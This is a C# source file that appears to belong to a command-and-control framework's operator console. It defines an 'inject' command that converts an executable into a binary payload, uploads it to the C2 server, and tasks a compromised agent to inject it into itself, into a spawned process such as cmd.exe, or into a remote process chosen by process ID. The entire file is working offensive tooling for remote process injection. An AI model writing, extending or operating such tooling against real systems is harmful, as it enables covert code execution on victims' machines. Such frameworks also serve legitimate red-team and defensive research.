using ApiModels.Response;
using Commander.Commands;
using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander
{
    public class InjectCommandOptions
    {
        public string injectionType { get; set; }
        public string fileToInject { get; set; }
        public string parameters { get; set; }
        public string processName { get; set; }
        public int? processId { get; set; }

        public bool raw { get; set; }
        public bool verbose { get; set; }
    }





    public class InjectCommand : EnhancedCommand<InjectCommandOptions>
    {

        public static string TmpFolder { get; set; } = "/Share/tmp/C2/Commander/Tmp";
        public static string ModuleFolder { get; set; } = "/Share/tmp/C2/Commander/Module";

        public override string Name => "inject";
        public override string Category => CommandCategory.Core;

        public override string Description => "Inject an executable";

        public virtual string ComputeParams(string innerParams)
        {
            return innerParams;
        }

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("injectionType", "Type of injection").FromAmong("self", "spawn", "remote"),
            new Argument<string>("fileToInject", "path of the file to inject"),
            new Argument<string>("parameters", () => string.Empty, "parameters to use"),
            new Option<string>(new[] { "--processName", "-p" }, () => "cmd.exe" ,"process name to start."),
            new Option<int?>(new[] { "--processId", "-i" }, "process id to inject to."),
            new Option(new[] { "--raw", "-r" }, "inject the raw file"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        protected override async Task<bool> HandleCommand(CommandContext<InjectCommandOptions> context)
        {
            string binFileName = string.Empty;
            if (!context.Options.raw)
            {
                context.Terminal.WriteLine($"Generating payload with params {this.ComputeParams(context.Options.parameters)}...");

                var result = GenerateBin(context.Options.fileToInject, this.ComputeParams(context.Options.parameters), out binFileName);
                if (context.Options.verbose)
                    context.Terminal.WriteLine(result);

                
            }
            else
            {
                binFileName = context.Options.fileToInject;
            }

            context.Terminal.WriteLine($"Pushing {binFileName} to the server...");
            byte[] fileBytes = null;
            using (FileStream fs = File.OpenRead(binFileName))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            bool first = true;
            var fileId = await context.CommModule.Upload(fileBytes, binFileName, a =>
            {
                context.Terminal.ShowProgress("uploading", a, first);
                first = false;
            });

            if (!context.Options.raw)
            {
                File.Delete(binFileName);
            }

            string fileName = Path.GetFileName(binFileName);

            if(context.Options.injectionType.Equals("spawn"))
            {
                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawn", fileId, fileName, $"{context.Options.processName}");
            }
            else if(context.Options.injectionType == "remote")
            {
                if(!context.Options.processId.HasValue)
                {
                    context.Terminal.WriteError("A processId is required.");
                    return false;
                }
                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-remote", fileId, fileName, $"{context.Options.processId}");
            }
            else //self
            {
                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-self", fileId, fileName);
            }

            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
            return true;
        }


        public static string GetRandomName()
        {
            return Guid.NewGuid().ToString();
        }

        public static string GenerateBin(string inputPath, string parameters, out string binPath)
        {
            var name = Path.Combine(TmpFolder, GetRandomName() + ".bin");
            string ret = Internal.BinMaker.GenerateBin(inputPath, name, parameters);
            binPath = name;
            return ret;
        }


    }

    
}
